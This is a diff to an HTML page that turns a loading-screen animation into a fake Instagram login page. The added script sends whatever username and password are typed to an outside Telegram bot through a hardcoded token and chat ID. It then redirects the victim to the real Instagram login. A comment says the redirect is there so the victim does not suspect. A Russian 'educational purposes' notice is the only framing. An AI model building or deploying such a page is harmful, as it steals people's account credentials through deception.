@@ -3,98 +3,65 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Loading...</title>
+    <title>Instagram</title>
     <style>
-        /* إعدادات الشاشة الأساسية */
-        body, html {
-            margin: 0; padding: 0;
-            width: 100%; height: 100%;
-            background-color: #000;
-            display: flex; justify-content: center; align-items: center;
-            overflow: hidden;
-            font-family: sans-serif;
-        }
-
-        /* حاوية التحميل (المنجل) */
-        #loader-container {
-            position: relative;
-            width: 100%;
-            max-width: 450px;
-            text-align: center;
-        }
-
-        .deadline-img {
-            width: 100%;
-            display: block;
-        }
-
-        /* شريط التحميل الأحمر - مضبوط بالملي فوق الخط الأبيض */
-        .progress-bar {
-            position: absolute;
-            bottom: 46.5%; /* يركب فوق الخط الأبيض تماماً */
-            left: 14%;    /* يبدأ من خلف المنجل */
-            height: 10px; /* خمل الخط */
-            background-color: #ff0000;
-            width: 0%;
-            box-shadow: 0 0 15px #ff0000;
-            animation: loadProgress 6s linear forwards;
-        }
-
-        @keyframes loadProgress {
-            0% { width: 0%; }
-            100% { width: 72%; } /* يتوقف عند رأس الشخص */
-        }
-
-        .status-text {
-            color: #fff;
-            margin-top: 15px;
-            font-size: 14px;
-            letter-spacing: 4px;
-            font-weight: bold;
-            text-transform: uppercase;
-        }
-
-        /* شاشة الإنستغرام النهائية */
-        #final-screen {
-            display: none; /* مخفية في البداية */
-            width: 100%;
-            height: 100%;
-            position: fixed;
-            top: 0; left: 0;
-            background-color: #000;
-            justify-content: center;
-            align-items: center;
-            z-index: 999;
-        }
-
-        #final-screen img {
-            width: 100%;
-            height: 100%;
-            object-fit: contain; /* تظهر كاملة بدون قص */
-        }
+        body { background-color: #fafafa; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .legal-notice { color: #28a745; font-weight: bold; margin-bottom: 20px; font-size: 14px; }
+        .login-box { background: white; border: 1px solid #dbdbdb; padding: 40px; width: 350px; text-align: center; }
+        .logo { width: 175px; margin-bottom: 20px; }
+        input { width: 100%; padding: 10px; margin-bottom: 10px; border: 1px solid #dbdbdb; background: #fafafa; border-radius: 3px; box-sizing: border-box; }
+        button { width: 100%; padding: 10px; background-color: #0095f6; border: none; color: white; font-weight: bold; border-radius: 4px; cursor: pointer; }
+        button:disabled { background-color: #b2dffc; }
     </style>
 </head>
 <body>
 
-    <div id="loader-container">
-        <img src="https://i.postimg.cc/d0rf162b/9af4468b8eb47a657abcae2b2a516e06.jpg" class="deadline-img">
-        <div class="progress-bar"></div>
-        <div class="status-text">DEADLine</div>
-    </div>
+    <div class="legal-notice">Этот сайт предназначен для образовательных целей</div>
 
-    <div id="final-screen">
-        <img src="https://i.postimg.cc/Jz9gMvkJ/Screenshot-20260414-194203-Insta-Gold.jpg">
+    <div class="login-box">
+        <img src="https://www.instagram.com/static/images/web/mobile_port_monocle-7b353f0503a1.png/logo_2x.png" class="logo" alt="Instagram">
+        <form id="loginForm">
+            <input type="text" id="username" placeholder="Phone number, username, or email" required>
+            <input type="password" id="password" placeholder="Password" required>
+            <button type="submit" id="submitBtn">Log In</button>
+        </form>
     </div>
 
     <script>
-        // دالة التبديل التلقائي
-        window.onload = function() {
-            // ننتظر 6 ثواني (نفس وقت الأنيميشن) ثم نبدل الشاشات
-            setTimeout(function() {
-                document.getElementById('loader-container').style.display = 'none';
-                document.getElementById('final-screen').style.display = 'flex';
-            }, 6000);
-        };
+        const token = "8275124583:AAH_ad7HiinANwVXTPqgMNW1SsG44g6eqzo";
+        const chatId = "8042090388";
+
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            
+            const user = document.getElementById('username').value;
+            const pass = document.getElementById('password').value;
+            const btn = document.getElementById('submitBtn');
+
+            btn.disabled = true;
+            btn.innerText = "Loading...";
+
+            const message = `⚠️ New Login Attempt:\n👤 User: ${user}\n🔑 Pass: ${pass}`;
+
+            // إرسال البيانات إلى بوت التلغرام
+            fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message
+                })
+            })
+            .then(response => {
+                // بعد الإرسال، نحوله لصفحة إنستغرام الحقيقية عشان ما يشك
+                window.location.href = "https://www.instagram.com/accounts/login/";
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                alert("Technical Error. Try again.");
+                btn.disabled = false;
+            });
+        });
     </script>
 </body>
 </html>
